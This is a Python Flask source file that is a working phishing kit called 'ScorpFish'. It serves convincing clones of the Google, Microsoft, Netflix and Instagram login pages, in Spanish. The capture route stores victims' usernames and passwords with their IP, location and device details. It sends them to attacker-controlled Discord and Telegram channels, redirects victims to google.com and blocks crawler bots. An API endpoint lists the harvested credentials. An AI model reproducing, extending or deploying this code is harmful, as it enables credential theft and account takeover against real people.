#!/usr/bin/env python3
from flask import Flask, request, render_template_string, redirect, jsonify, abort
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import sqlite3
import json
import requests
import hashlib
import time
import re
import os
from datetime import datetime
from functools import wraps
from user_agents import parse

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32)

# Rate limiting
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

# Configuración
CONFIG = {
    'webhook_discord': None,
    'webhook_telegram_token': None,
    'webhook_telegram_chat': None,
    'redirect_url': 'https://www.google.com',
    'blocked_countries': [],
    'allowed_referers': [],
    'template': 'google'
}

def load_config():
    try:
        with open('config.json', 'r') as f:
            CONFIG.update(json.load(f))
    except:
        pass

def init_db():
    conn = sqlite3.connect('credentials.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            ip TEXT,
            username TEXT,
            password TEXT,
            user_agent TEXT,
            referer TEXT,
            geo_location TEXT,
            isp TEXT,
            device_type TEXT,
            browser TEXT,
            os TEXT,
            hash TEXT UNIQUE,
            viewed INTEGER DEFAULT 0
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS access_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            ip TEXT,
            path TEXT,
            user_agent TEXT,
            blocked INTEGER DEFAULT 0
        )
    ''')
    conn.commit()
    conn.close()

def get_client_info():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in str(ip):
        ip = ip.split(',')[0].strip()
    return ip

def get_geo_data(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,org,as,query", timeout=3)
        data = response.json()
        if data.get('status') == 'success':
            return {
                'country': data.get('country', 'Unknown'),
                'region': data.get('regionName', 'Unknown'),
                'city': data.get('city', 'Unknown'),
                'isp': data.get('isp', 'Unknown'),
                'location': f"{data.get('city', 'Unknown')}, {data.get('country', 'Unknown')}"
            }
    except:
        pass
    return {'country': 'Unknown', 'region': 'Unknown', 'city': 'Unknown', 'isp': 'Unknown', 'location': 'Unknown'}

def get_device_info(ua_string):
    try:
        ua = parse(ua_string)
        return {
            'device': ua.device.family,
            'browser': ua.browser.family,
            'os': ua.os.family,
            'is_mobile': ua.is_mobile,
            'is_pc': ua.is_pc
        }
    except:
        return {'device': 'Unknown', 'browser': 'Unknown', 'os': 'Unknown', 'is_mobile': False, 'is_pc': True}

def check_bot(ua_string):
    bot_patterns = ['bot', 'crawler', 'spider', 'scrape', 'facebook', 'google', 'bing', 'yandex', 'baidu']
    ua_lower = ua_string.lower() if ua_string else ''
    return any(pattern in ua_lower for pattern in bot_patterns)

def log_access(ip, path, ua, blocked=0):
    conn = sqlite3.connect('credentials.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO access_logs (timestamp, ip, path, user_agent, blocked)
        VALUES (?, ?, ?, ?, ?)
    ''', (datetime.now().isoformat(), ip, path, ua, blocked))
    conn.commit()
    conn.close()

def send_discord(data):
    if not CONFIG.get('webhook_discord'):
        return
    
    embed = {
        "title": "🎯 Nueva Captura",
        "color": 0x00ff00,
        "fields": [
            {"name": "📍 IP", "value": f"```{data['ip']}```", "inline": True},
            {"name": "🌍 Ubicación", "value": f"```{data['geo']['location']}```", "inline": True},
            {"name": "📡 ISP", "value": f"```{data['geo']['isp']}```", "inline": True},
            {"name": "👤 Usuario", "value": f"```{data['username']}```", "inline": False},
            {"name": "🔑 Contraseña", "value": f"```{data['password']}```", "inline": False},
            {"name": "🔍 Navegador", "value": f"```{data['device']['browser']}```", "inline": True},
            {"name": "💻 Sistema", "value": f"```{data['device']['os']}```", "inline": True},
            {"name": "📱 Dispositivo", "value": f"```{data['device']['device']}```", "inline": True},
        ],
        "footer": {"text": f"ScorpFish • {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}
    }
    
    try:
        requests.post(CONFIG['webhook_discord'], json={"embeds": [embed]}, timeout=5)
    except:
        pass

def send_telegram(data):
    if not CONFIG.get('webhook_telegram_token') or not CONFIG.get('webhook_telegram_chat'):
        return
    
    message = f"""🎯 *Nueva Captura*

📍 *IP:* `{data['ip']}`
🌍 *Ubicación:* `{data['geo']['location']}`
📡 *ISP:* `{data['geo']['isp']}`

👤 *Usuario:* `{data['username']}`
🔑 *Pass:* `{data['password']}`

🔍 *{data['device']['browser']}* en *{data['device']['os']}*"""
    
    try:
        url = f"https://api.telegram.org/bot{CONFIG['webhook_telegram_token']}/sendMessage"
        requests.post(url, json={
            "chat_id": CONFIG['webhook_telegram_chat'],
            "text": message,
            "parse_mode": "Markdown"
        }, timeout=5)
    except:
        pass

def get_template(template_name='google'):
    templates = {
        'google': '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión - Google</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Roboto', sans-serif; 
            background: #fff; 
            display: flex; 
            flex-direction: column;
            min-height: 100vh;
        }
        .header {
            padding: 24px 24px 0;
            display: flex;
            align-items: center;
        }
        .header img { height: 24px; }
        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .form-box {
            width: 100%;
            max-width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
        }
        .logo {
            text-align: center;
            margin-bottom: 16px;
        }
        .logo img { height: 40px; }
        h1 {
            text-align: center;
            color: #202124;
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
        }
        .subtitle {
            text-align: center;
            color: #5f6368;
            font-size: 16px;
            margin-bottom: 32px;
        }
        .input-group {
            position: relative;
            margin-bottom: 24px;
        }
        input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            transition: all 0.2s;
        }
        input:focus {
            outline: none;
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px rgba(26,115,232,0.1);
        }
        .forgot {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            display: block;
            margin-bottom: 40px;
        }
        .forgot:hover { text-decoration: underline; }
        .actions {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .create-account {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
        }
        .create-account:hover { text-decoration: underline; }
        button {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }
        button:hover { background: #1557b0; }
        .footer {
            padding: 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 12px;
            color: #5f6368;
        }
        .footer-links a {
            color: #5f6368;
            text-decoration: none;
            margin-right: 24px;
        }
        .footer-links a:hover { text-decoration: underline; }
        .lang-selector {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .error {
            color: #d93025;
            font-size: 14px;
            margin-top: -16px;
            margin-bottom: 16px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
    </div>
    <div class="container">
        <div class="form-box">
            <div class="logo">
                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
            </div>
            <h1>Iniciar sesión</h1>
            <p class="subtitle">Utiliza tu cuenta de Google</p>
            <form action="/capture" method="POST" id="loginForm">
                <div class="input-group">
                    <input type="email" name="email" id="email" placeholder="Correo electrónico o teléfono" required autocomplete="username">
                </div>
                <div class="error" id="emailError">Ingresa un correo electrónico o número de teléfono válido.</div>
                <div class="input-group">
                    <input type="password" name="password" id="password" placeholder="Introduce tu contraseña" required autocomplete="current-password">
                </div>
                <a href="#" class="forgot">¿Olvidaste la contraseña?</a>
                <div class="actions">
                    <a href="#" class="create-account">Crear cuenta</a>
                    <button type="submit">Siguiente</button>
                </div>
            </form>
        </div>
    </div>
    <div class="footer">
        <div class="lang-selector">
            <span>Español (Latinoamérica)</span>
        </div>
        <div class="footer-links">
            <a href="#">Ayuda</a>
            <a href="#">Privacidad</a>
            <a href="#">Términos</a>
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const email = document.getElementById('email').value;
            const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
            if (!emailRegex.test(email) && !/^\\d{10,}$/.test(email)) {
                e.preventDefault();
                document.getElementById('emailError').style.display = 'block';
            }
        });
    </script>
</body>
</html>''',
        
        'microsoft': '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión en tu cuenta</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Helvetica Neue', sans-serif; }
        body { 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container { 
            background: white; 
            width: 100%;
            max-width: 440px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
            padding: 44px;
            position: relative;
        }
        .logo { 
            width: 108px; 
            margin-bottom: 16px;
        }
        h1 { 
            font-size: 24px; 
            font-weight: 600; 
            color: #1b1b1b;
            margin-bottom: 12px;
        }
        .input-group { margin-bottom: 16px; }
        input { 
            width: 100%; 
            padding: 12px;
            border: 1px solid #ccc;
            font-size: 15px;
            outline: none;
        }
        input:focus { border-color: #0067b8; }
        button { 
            width: 100%; 
            padding: 12px; 
            background: #0067b8; 
            color: white; 
            border: none; 
            font-size: 15px; 
            cursor: pointer;
            margin-top: 8px;
        }
        button:hover { background: #005a9e; }
        .links {
            margin-top: 20px;
            font-size: 13px;
        }
        .links a {
            color: #0067b8;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="logo">
        <h1>Iniciar sesión</h1>
        <form action="/capture" method="POST">
            <div class="input-group">
                <input type="email" name="email" placeholder="Correo, teléfono o Skype" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Contraseña" required>
            </div>
            <p style="font-size: 13px; color: #666; margin: 16px 0;">
                <a href="#" style="color: #0067b8; text-decoration: none;">¿No tiene acceso a su dispositivo?</a>
            </p>
            <button type="submit">Iniciar sesión</button>
        </form>
        <div class="links">
            <a href="#">Términos de uso</a> | <a href="#">Privacidad y cookies</a>
        </div>
    </div>
</body>
</html>''',
        
        'netflix': '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; }
        body { 
            background: #141414;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .header {
            padding: 24px 48px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .logo { 
            color: #e50914; 
            font-size: 28px; 
            font-weight: bold;
            letter-spacing: -1px;
        }
        .container { 
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .form-box {
            background: rgba(0,0,0,0.75);
            padding: 60px 68px;
            width: 100%;
            max-width: 450px;
            border-radius: 4px;
        }
        h1 { 
            color: white; 
            font-size: 32px; 
            margin-bottom: 28px; 
            font-weight: 700;
        }
        .input-group { position: relative; margin-bottom: 16px; }
        input { 
            width: 100%; 
            padding: 16px;
            background: #333;
            border: none;
            border-radius: 4px;
            color: white;
            font-size: 16px;
            height: 50px;
        }
        input::placeholder { color: #8c8c8c; }
        button { 
            width: 100%; 
            padding: 16px; 
            background: #e50914; 
            color: white; 
            border: none; 
            border-radius: 4px; 
            font-size: 16px; 
            font-weight: 700;
            cursor: pointer;
            margin-top: 24px;
        }
        button:hover { background: #f40612; }
        .help {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 12px;
            color: #b3b3b3;
            font-size: 13px;
        }
        .help a { color: #b3b3b3; text-decoration: none; }
        .help a:hover { text-decoration: underline; }
        .signup {
            margin-top: 48px;
            color: #737373;
            font-size: 16px;
        }
        .signup a { color: white; text-decoration: none; }
        .signup a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">NETFLIX</div>
    </div>
    <div class="container">
        <div class="form-box">
            <h1>Iniciar sesión</h1>
            <form action="/capture" method="POST">
                <div class="input-group">
                    <input type="email" name="email" placeholder="Email o número de teléfono" required>
                </div>
                <div class="input-group">
                    <input type="password" name="password" placeholder="Contraseña" required>
                </div>
                <button type="submit">Iniciar sesión</button>
                <div class="help">
                    <label style="display: flex; align-items: center; gap: 4px; cursor: pointer;">
                        <input type="checkbox" style="width: auto; height: auto;">
                        <span>Recuérdame</span>
                    </label>
                    <a href="#">¿Necesitas ayuda?</a>
                </div>
                <div class="signup">
                    ¿Primera vez en Netflix? <a href="#">Suscríbete ahora</a>.
                </div>
            </form>
        </div>
    </div>
</body>
</html>''',
        
        'instagram': '''<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { 
            background: #fafafa;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            padding-top: 40px;
        }
        .container {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 40px;
            width: 350px;
            text-align: center;
            margin-bottom: 10px;
        }
        .logo {
            background-image: url('https://www.instagram.com/static/bundles/es6/sprite_core_2x_bcd90fc1f44c.png');
            background-size: 440px 411px;
            background-position: -176px -264px;
            width: 175px;
            height: 51px;
            margin: 0 auto 30px;
            display: block;
        }
        .input-group { margin-bottom: 6px; }
        input {
            width: 100%;
            padding: 9px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 14px;
        }
        input:focus {
            outline: none;
            border-color: #a8a8a8;
        }
        button {
            width: 100%;
            padding: 8px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 12px;
        }
        button:hover { background: #0081d6; }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
            margin: 0 16px;
        }
        .fb-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .forgot {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            margin-top: 20px;
            display: block;
        }
        .signup-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 24px;
            width: 350px;
            text-align: center;
            font-size: 14px;
        }
        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"></div>
        <form action="/capture" method="POST">
            <div class="input-group">
                <input type="text" name="email" placeholder="Teléfono, usuario o correo electrónico" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Contraseña" required>
            </div>
            <button type="submit">Iniciar sesión</button>
        </form>
        <div class="divider">O</div>
        <a href="#" class="fb-login">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="#385185"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
            Iniciar sesión con Facebook
        </a>
        <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
    </div>
    <div class="signup-box">
        ¿No tienes una cuenta? <a href="#">Regístrate</a>
    </div>
</body>
</html>'''
    }
    
    return templates.get(template_name, templates['google'])

@app.before_request
def before_request():
    ip = get_client_info()
    ua = request.headers.get('User-Agent', '')
    
    # Log all access
    log_access(ip, request.path, ua)
    
    # Check for bots (optional blocking)
    if check_bot(ua) and request.path == '/':
        abort(403)

@app.route('/')
@limiter.limit("10 per minute")
def index():
    template = CONFIG.get('template', 'google')
    return render_template_string(get_template(template))

@app.route('/capture', methods=['POST'])
@limiter.limit("5 per minute")
def capture():
    ip = get_client_info()
    ua = request.headers.get('User-Agent', '')
    
    # Get detailed info
    geo = get_geo_data(ip)
    device = get_device_info(ua)
    
    username = request.form.get('email') or request.form.get('username', '')
    password = request.form.get('password', '')
    
    # Create hash for deduplication
    hash_str = hashlib.md5(f"{ip}:{username}:{password}".encode()).hexdigest()
    
    data = {
        'timestamp': datetime.now().isoformat(),
        'ip': ip,
        'username': username,
        'password': password,
        'user_agent': ua,
        'referer': request.headers.get('Referer', ''),
        'geo': geo,
        'device': device,
        'hash': hash_str
    }
    
    # Save to DB
    try:
        conn = sqlite3.connect('credentials.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR IGNORE INTO credentials 
            (timestamp, ip, username, password, user_agent, referer, geo_location, isp, device_type, browser, os, hash)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (data['timestamp'], data['ip'], data['username'], data['password'],
              data['user_agent'], data['referer'], geo['location'], geo['isp'],
              device['device'], device['browser'], device['os'], hash_str))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"DB Error: {e}")
    
    # Send notifications
    send_discord(data)
    send_telegram(data)
    
    # Redirect
    return redirect(CONFIG.get('redirect_url', 'https://www.google.com'))

@app.route('/api/credentials')
@limiter.limit("30 per hour")
def api_credentials():
    auth_key = request.headers.get('X-API-Key')
    if auth_key != 'your-secret-key-here':
        abort(401)
    
    conn = sqlite3.connect('credentials.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT id, timestamp, ip, username, password, geo_location, isp, browser, os, viewed 
        FROM credentials ORDER BY id DESC
    ''')
    rows = cursor.fetchall()
    
    # Mark as viewed
    cursor.execute('UPDATE credentials SET viewed = 1 WHERE viewed = 0')
    conn.commit()
    conn.close()
    
    return jsonify([{
        'id': r[0], 'timestamp': r[1], 'ip': r[2], 'username': r[3],
        'password': r[4], 'location': r[5], 'isp': r[6],
        'browser': r[7], 'os': r[8], 'viewed': r[9]
    } for r in rows])

@app.route('/api/stats')
def api_stats():
    conn = sqlite3.connect('credentials.db', check_same_thread=False)
    cursor = conn.cursor()
    
    cursor.execute('SELECT COUNT(*) FROM credentials')
    total = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(*) FROM credentials WHERE viewed = 0')
    new = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(DISTINCT ip) FROM credentials')
    unique_ips = cursor.fetchone()[0]
    
    cursor.execute('''
        SELECT geo_location, COUNT(*) as count 
        FROM credentials GROUP BY geo_location ORDER BY count DESC LIMIT 5
    ''')
    top_countries = cursor.fetchall()
    
    conn.close()
    
    return jsonify({
        'total_captures': total,
        'new_captures': new,
        'unique_ips': unique_ips,
        'top_locations': top_countries
    })

@app.route('/health')
def health():
    return jsonify({'status': 'ok', 'timestamp': datetime.now().isoformat()})

if __name__ == '__main__':
    load_config()
    init_db()
    print("[+] Servidor mejorado iniciado")
    print(f"[+] Template: {CONFIG.get('template', 'google')}")
    print("[+] Endpoints: /, /capture, /api/credentials, /api/stats, /health")
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)), debug=False)
